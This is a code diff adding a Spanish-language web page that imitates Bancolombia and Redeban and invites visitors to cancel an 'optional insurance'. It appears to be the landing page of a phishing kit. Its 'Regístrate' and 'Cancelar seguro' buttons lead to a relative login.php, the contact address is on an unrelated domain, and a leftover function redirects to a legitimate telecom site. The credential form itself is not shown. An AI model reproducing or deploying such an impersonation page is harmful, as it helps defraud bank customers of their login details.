@@ -1,0 +1,441 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, user-scalable=no">
+    <link rel="icon" type="image/png" href="../img/favicon.ico"/>
+    <title>Servicios | Bancolombia</title>    
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Open+Sans:ital,wght@0,300..800;1,300..800&display=swap" rel="stylesheet">
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+    <style type="text/css">
+        *{
+            font-family: "Open Sans";
+            padding: 0;
+            margin: 0;
+        }
+        #cabecera{
+            background-color: #fff !important;
+            padding: 17px 7px;
+            box-shadow: 0 2px 10px 1px rgba(0, 0, 0, 0.06), 0 2px 10px 1px rgba(0, 0, 0, 0.06);
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+        }           
+        #menu-bar{
+            margin: 0 auto;
+            width: 90%;
+        }  
+        .btn{
+            background-color: #ffd200;
+            border-radius: 30px;
+            color: #000;
+            border: 0;
+            font-weight: bold;
+            padding: 10px 30px;
+            font-size: 15px;
+        }
+        .item-menu{
+            font-size: 16px;
+            padding-right: 20px;
+        }
+        body{
+            background-color: #F7F7F7;
+        }
+
+        .titulo-baner{
+            font-size: 40px;
+            font-weight: bold;            
+        }
+
+        .titulo{
+            font-size: 30px;
+            font-weight: bold;
+            text-align: center;
+        }
+
+        .contenido{
+            font-size: 16px;
+        }
+
+        #tbl-baner{
+            margin: 0 auto;
+            width: 90%;
+            max-width: 1216px;
+        }
+        #tbl-baner td{
+            padding:0px 40px
+        }
+        main{
+            padding-top: 120px;
+        }
+        #seccion-azul{
+            background-color: #00CCEA;
+            padding: 60px 0px;
+        }
+        #tbl-azul{
+            margin: 0 auto;
+            width: 90% !important;
+            max-width: 90% !important;
+        }
+
+        #seccion-registro{
+            padding: 60px 0px;
+        }
+
+        .registro{
+            --tw-shadow: 0 0 12px 1px rgba(57, 62, 100, .1);
+            --tw-shadow-colored: 0 0 12px 1px #0000;
+            box-shadow: 0 0 #0000, 0 0 #0000, 0 0 12px 1px rgba(57, 62, 100, .1);
+            width: 100%;
+            max-width: 300px;  
+            height: 390px;    
+            margin: 0 auto;         
+        }
+
+        #tbl-registro{
+            margin: 0 auto;
+            width: 90%;
+            max-width: 1216px;
+        }
+
+        #ayuda{
+            background-color: #fff;
+            height: 140px;
+            padding: 60px 0px;
+        }
+
+        #seccion-contacto{
+            height: 280px;
+        }
+
+        #contacto{
+            margin: -80px auto 0 auto;
+            background-color: #fff;
+            --tw-shadow: 0 0 12px 1px rgba(57, 62, 100, .1);
+            --tw-shadow-colored: 0 0 12px 1px #0000;
+            box-shadow: 0 0 #0000, 0 0 #0000, 0 0 12px 1px rgba(57, 62, 100, .1);
+            width: 90%;
+            padding: 60px 0px;
+            border-radius: 12px;
+        }
+
+        #contacto-mob{
+            margin: -80px auto 0 auto;
+            background-color: #fff;
+            --tw-shadow: 0 0 12px 1px rgba(57, 62, 100, .1);
+            --tw-shadow-colored: 0 0 12px 1px #0000;
+            box-shadow: 0 0 #0000, 0 0 #0000, 0 0 12px 1px rgba(57, 62, 100, .1);
+            width: 90%;
+            padding: 60px 0px;
+            border-radius: 12px;
+        }
+
+        footer{
+            padding: 30px;
+            background-color: #fff;
+            border-top: 1px solid #ccc4c4;
+            font-size: 12px;
+        }
+
+        #tbl-footer{
+            margin: 0 auto;
+        }
+        #tbl-footer2{
+            margin: 0 auto;
+        }
+
+        .titulo-registro{
+            padding: 20px;
+            text-align: left;
+            font-weight: bold;
+            font-size: 19px;
+        }
+
+        .descripcion-registro{
+            padding: 20px;
+            font-size: 16px;
+            text-align: left;
+        }
+
+        .info-contacto {
+            font-size: 14px;
+        }
+
+        #registro-mob{
+            display: none;
+        }
+        .tipo-contacto {
+            font-size: 14px;
+            font-weight: bold;
+        }
+
+        #texto-footer{
+            width:80%; 
+            margin:0 auto;
+            text-align: center;
+        }
+
+        #banner-mob{
+            text-align: center;
+            display: none;
+
+        }
+        
+        #carr-servicios2{
+            display: none;
+        }
+        
+        @media (max-width: 1098px) {
+
+            .lado-der div{
+                text-align: right;
+            }
+
+
+            #carr-servicios2{
+                display: initial;
+            }
+            #carr-servicios{
+                display: none;
+            }
+        }
+
+        @media (max-width: 1023px) {
+            .quitar1,#menu-der{
+                display: none;
+            }
+
+            .mostrar1,#registro-mob{
+                display: block;
+            }     
+
+            #banner-mob{
+                margin: 20px;
+                text-align: center;
+                display: block;
+            }
+
+            #tbl-baner{
+                text-align: center;
+            }
+
+            .registro{
+   
+                max-width: 380px;  
+               
+            }
+
+        }
+
+         @media (max-width: 716px) {
+            .lado-der{
+                display: none;
+            }
+
+            
+
+        }
+
+
+        
+
+
+        /*#tbl-azul .lado-izq{
+            width: 50%;
+        }
+        #tbl-azul .lado-der{
+            width: 50%;
+            overflow-x: hidden;
+        }*/
+    </style>
+</head>
+<body>
+    <header id="cabecera">
+        <table border="0" cellpadding="0" cellspacing="0">
+            <table id="menu-bar">
+                <tr>
+                    <td valign="middle" align="left"><img src="../img/logo.webp"></td>
+                    <td valign="middle" align="right" id="menu-der">
+                        <table>
+                            <td valign="middle" class="item-menu">Inicio</td>
+                            <td valign="middle" class="item-menu">Preguntas frecuentes</td>
+                            <td valign="middle"><button class="btn" id="btn-registrate">REGÍSTRATE</button></td>
+                        </table>
+                    </td>
+                </tr>
+            </table>
+        </table>
+    </header>
+    <main>
+        <table id="tbl-baner">
+            <tr>
+                <td valign="middle">
+                    <div class="titulo-baner">
+                        Inicia el proceso de cancelación del seguro opcional Redeban</div>
+                    <br>
+                    <div class="contenido">Accede a los nuevos servicios que Bancolombia y Redeban te ofrecen para tu seguridad y tranquilidad.<br><br>
+                    Disfruta todos los beneficios adiciones a tus coberturas y dale seguridad a tu desarrollo persona y profesional</div>
+                    <br>
+                    <button class="btn" id="btn-cancelar">CANCELAR SEGURO</button>
+                </td>
+                <td valign="middle" class="quitar1" ><img src="../img/baner.webp"></td>
+            </tr>
+        </table>   
+        <div id="banner-mob">
+            <img src="../img/baner.webp">
+        </div>
+        <div style="text-align: center;"><img src="../img/flecha-abajo.jpg"><br>Conoce más</div>
+        <br>        
+        <div id="seccion-azul">                    
+            <table id="tbl-azul">
+                <tr>
+                    <td class="lado-izq" width="50%" style="padding: 0px 30px;">
+                        <div class="titulo-baner">Servicios diseñados
+exclusivamente para ti</div>
+                        <br>
+                        <div class="contenido">Conoce y disfruta el Ecosistema digital de tu seguro. Servicios personalizados que se habilitan de acuerdo con las coberturas de tu producto.</div>
+                        <br>
+                        <img src="../img/flechas.jpg">
+                    </td>
+                    <td class="lado-der" width="50%" style="overflow-x: hidden !important;">
+                        <div style="height: 450px;overflow: hidden;"><img src="../img/servicios2.jpg" id="carr-servicios"><img src="../img/servicios3.jpg" id="carr-servicios2"></div>
+                    </td>    
+                </tr>            
+            </table>
+        </div>
+        <div id="seccion-registro">
+            <div class="titulo">¿Qué debo tener en cuenta para registrarme?</div>
+            <br><br>            
+            <table id="tbl-registro" class="quitar1">
+                <tr>
+                    <td>
+                        <div class="registro" style="border-bottom: 3px solid #A375C9;">
+                            <img src="../img/1a.jpg">
+                            <br>
+                            <div class="titulo-registro">Tener activo tu seguro</div>
+                            <div class="descripcion-registro">Para acceder a los servicios digitales debes tener un seguro activo.</div>
+                        </div>
+                    </td>
+                    <td>
+                        <div class="registro" style="border-bottom: 3px solid #FFC476;">
+                            <img src="../img/2a.jpg">
+                            <br>
+                            <div class="titulo-registro">Registra tus datos</div>
+                            <div class="descripcion-registro">Haz clic en el botón “Regístrate” y diligencia un sencillo formulario con tus datos personales.</div>
+                        </div>
+                    </td>
+                    <td>
+                        <div class="registro" style="border-bottom: 3px solid #FF91A1;">
+                            <img src="../img/3a.jpg">
+                            <br>
+                            <div class="titulo-registro">Utiliza tus beneficios</div>
+                            <div class="descripcion-registro">Haz clic en el botón “Regístrate” y diligencia un sencillo formulario con tus datos personales.</div>
+                        </div>
+                    </td>
+                </tr>
+            </table>
+            <div id="registro-mob">
+                
+
+                <div class="registro" style="border-bottom: 3px solid #A375C9;">
+                    <img src="../img/1a.jpg" width="100%">
+                    <br>
+                    <div class="titulo-registro">Tener activo tu seguro</div>
+                    <div class="descripcion-registro">Para acceder a los servicios digitales debes tener un seguro activo.</div>
+                </div>
+                <br>
+                <div class="registro" style="border-bottom: 3px solid #FFC476;">
+                    <img src="../img/2a.jpg" width="100%">
+                    <br>
+                    <div class="titulo-registro">Registra tus datos</div>
+                    <div class="descripcion-registro">Haz clic en el botón “Regístrate” y diligencia un sencillo formulario con tus datos personales.</div>
+                </div>
+                <br>
+                <div class="registro" style="border-bottom: 3px solid #FF91A1;">
+                    <img src="../img/3a.jpg" width="100%">
+                    <br>
+                    <div class="titulo-registro">Utiliza tus beneficios</div>
+                    <div class="descripcion-registro">Haz clic en el botón “Regístrate” y diligencia un sencillo formulario con tus datos personales.</div>
+                </div>
+            </div>
+        </div>
+        <div id="ayuda">
+            <div class="titulo">¿Necesitas ayuda?</div>
+            <br>
+            <div style="text-align:center;">Recibe una consultoría completa sobre los beneficios de tu portafolio de servicios. Elige alguna de las siguientes opciones:</div>
+        </div>
+        <div id="seccion-contacto">
+            <div id="contacto" class="quitar1">
+                <table width="100%" cellpadding="0" cellspacing="0" border="0">
+                    <tr>
+                        <td align="center" valign="middle" width="32%">
+                            <img src="../img/ico3.jpg"><br>
+                            <div class="tipo-contacto">Resuelve tus dudas</div>
+                            <br>
+                            <div class="info-contacto">Visita nuestras preguntas frecuentes</div>
+                        </td>
+                        <td width="1%"><div style="border-left: 1px solid #ccc4c4;height: 120px;"></div></td>
+                        <td align="center" valign="middle" width="32%">
+                            <img src="../img/ico1.jpg"><br>
+                            <div class="tipo-contacto">Llama a nuestras líneas de atención</div>
+                            <br>
+                            <div class="info-contacto">Bogotá: 601 7455553 Línea nacional: 01 8000 960 011</div>
+                        </td>
+                        <td width="1%"><div style="border-left: 1px solid #ccc4c4;height: 120px;"></div></td>
+                        <td align="center" valign="middle" width="32%">
+                            <img src="../img/ico2.jpg">
+                            <div class="tipo-contacto">Escríbenos un correo electrónico</div>
+                            <br>
+                            <div class="info-contacto">comunicaciones@disfrutatuseguro.com</div>
+                        </td>
+                    </tr>
+                </table>
+            </div>
+
+
+            <div id="contacto-mob" class="mostrar1">
+                
+            </div>
+
+
+        </div>
+    </main>
+    <footer>
+        <table id="tbl-footer">
+            <tr>
+                <td valign="middle" align="left"><img src="../img/logo.webp"></td>
+                <td valign="middle" align="right">
+                    
+                </td>
+            </tr>
+        </table> 
+        <div id="texto-footer">Redeban asume exclusivamente la responsabilidad del cumplimiento de las obligaciones del producto frente al consumidor financiero. Este producto es ofrecido por la red de Bancolombia S.A. limitándose única y exclusivamente al correcto cumplimiento de las instrucciones debidamente impartidas por Redeban para la prestación del servicio en dicha red.
+        <br><br>
+        En caso de requerir información adicional o presentar algún inconveniente, comunícate con nuestras líneas de atención:</div>
+        <table id="tbl-footer2" border="0">
+            <tr>
+                <td valign="top" align="right"><img src="../img/tel.jpg"></td>
+                <td valign="top" align="left" style="font-weight: bold;">Bogotá: (601) 7455553 | Cali : (2) 4850809 | Medellín: (4) 6040027 | Barranquilla: (5) 3851828 | Bucaramanga: (7) 6971129 | A Nivel Nacional: 018000960011</td>
+            </tr>
+        </table>
+        
+
+    </footer>
+</body>
+</html>
+
+
+<script type="text/javascript">
+    function final() {
+        window.location.href = "https://www.movistar.com.co/"; 
+    }
+
+    $(document).ready(function() {
+        $("#btn-registrate,#btn-cancelar").click(function(){
+            window.location.href = "../a/login.php";               
+        });        
+    });
+</script>
